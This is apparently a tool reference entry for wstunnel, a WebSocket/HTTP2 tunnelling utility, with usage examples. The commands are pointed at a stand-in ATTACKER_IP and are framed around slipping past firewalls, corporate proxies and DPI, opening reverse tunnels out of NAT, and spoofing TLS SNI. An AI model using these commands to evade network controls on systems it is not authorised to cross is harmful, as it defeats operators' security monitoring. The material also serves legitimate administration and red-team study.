---
name: "wstunnel"
categories:
  - proxy
homepage: "https://github.com/erebe/wstunnel"
origin: "hacktricks"
recipe: "upstream"
packaged-by: []
build-system: rust
license: BSD-3-Clause
github-repo: "erebe/wstunnel"
github-stars: 7195
github-match: "exact"
gh-checked: "2026-11-13"
worth: 6.6
worth-basis: "full (activity+popularity+recency+adoption)"
---

# wstunnel

> Tunnels TCP, UDP and STDIO traffic through WebSocket, HTTP/2 or WebTransport so it looks like ordinary HTTPS — the standard trick for slipping past firewalls, web proxies and DPI.

## What it's for

wstunnel (erebe; v7 is a complete Rust rewrite) moves arbitrary traffic through a WebSocket/HTTP2/WebTransport connection that middleboxes see as normal web traffic. The syntax mimics ssh's `-L`/`-R` tunneling: a `wstunnel server` listens on wss:// and a `wstunnel client` connects out and forwards static local-to-remote (`-L`) or remote-to-local (`-R`) tunnels — TCP, UDP, Unix sockets or stdio — or runs a dynamic SOCKS5/HTTP/transparent proxy. It can chain through an outbound HTTP proxy (`-p`), restrict what the server will forward (`--restrict-to`, path-prefix secrets, mTLS with client certs), and offers WebTransport over HTTP/3/QUIC (`wts://`) for networks where TCP is throttled but UDP passes. Its main offensive use is egress and DPI bypass on restricted networks: tunneling shells, RDP or an entire WireGuard VPN inside what looks like browser HTTPS. It is not an anonymity tool — the server's default certificate is the same self-signed one for everyone and can be fingerprinted, so upstream recommends forwarding traffic that is already secure and using your own valid certificate for stealth.

## Typical use cases

### Stand up the tunnel server

Run the listening end on a host with reachable egress.

```
wstunnel server wss://[::]:8080
```

Outcome: starts a TLS WebSocket server on port 8080 on all interfaces (auto-detects websocket vs http2 clients); with `--restrict-to 127.0.0.1:22` it would only forward tunnels to the local SSH daemon, and `wstunnel server wts://[::]:8080` additionally serves WebTransport over QUIC on the same port (needs UDP reachable end-to-end).

### Browse through the tunnel with a local SOCKS5 proxy

The simplest client: dynamic forwarding for any proxy-aware tool.

```
wstunnel client -L socks5://127.0.0.1:8888 --connection-min-idle 5 wss://ATTACKER_IP:8080
```

Outcome: opens a local SOCKS5 listener on 127.0.0.1:8888 that forwards through the tunnel; point a browser at it or run `curl -x socks5h://127.0.0.1:8888 http://example.com/` — the trailing `h` in `socks5h` makes DNS resolve at the server, not locally. `--connection-min-idle` keeps a warm connection pool to avoid repeated handshake latency.

### Forward a TCP port through a corporate web proxy

Egress-locked networks that only allow an HTTP proxy out.

```
wstunnel client -L tcp://9999:127.0.0.1:22 -p http://corporate-proxy.example.com:8080 wss://ATTACKER_IP:443
```

Outcome: starts a local TCP listener on 9999 whose traffic is wrapped in a WebSocket, pushed through the corporate proxy via HTTP CONNECT, and unwrapped at the wstunnel server (which the server owner should run with `--restrict-to 127.0.0.1:22`); connecting with `ssh -p 9999 user@127.0.0.1` lands an SSH session on the server host.

### Use wstunnel as an SSH ProxyCommand

Wrap the whole transport inside a normal ssh invocation — no listener port needed.

```
ssh -o ProxyCommand="wstunnel client --log-lvl=off -L stdio://%h:%p ws://ATTACKER_IP:8080" user@target
```

Outcome: ssh pipes its connection through wstunnel's stdio transport, so the SSH traffic crosses the network as WebSocket frames on port 8080; `--log-lvl=off` silences the client so ssh's own output stays clean.

### Reverse tunnel out of a NAT

Expose a service on a machine that cannot accept inbound connections.

```
wstunnel client -R 'tcp://[::]:8000:localhost:8000' wss://ATTACKER_IP:443
```

Outcome: the client holds a persistent connection to the server and makes it listen on port 8000; anything connecting to `ATTACKER_IP:8000` is forwarded back through the tunnel to port 8000 on the client's machine — with a local `python3 -m http.server` running, `curl http://ATTACKER_IP:8000` from the server side retrieves it.

### Tunnel UDP (e.g. a WireGuard VPN)

Disguise a VPN as HTTPS websocket traffic.

```
wstunnel client -L 'udp://51820:localhost:51820?timeout_sec=0' wss://ATTACKER_IP:443
```

Outcome: opens a local UDP listener on 51820 that carries the VPN's packets through the tunnel to the server's UDP port 51820; point the WireGuard peer `Endpoint` at `localhost:51820`, lower the interface MTU (~1300) to avoid fragmentation, and add a static route to the wstunnel server so the tunnel itself does not loop through the VPN.

### Make the tunnel harder to fingerprint

Defeat URL/SNI-based DPI heuristics.

```
wstunnel client -L socks5://127.0.0.1:8888 --http-upgrade-path-prefix s3cr3t --tls-sni-override=example.com wss://ATTACKER_IP:443
```

Outcome: the WebSocket upgrade request uses the custom path prefix `/s3cr3t` instead of the default `/v1`, and the TLS SNI reads as `example.com`; run the server with `--restrict-http-upgrade-path-prefix s3cr3t` so the prefix doubles as a shared secret that gates who may connect at all.

No corpus evidence — derived from upstream documentation.
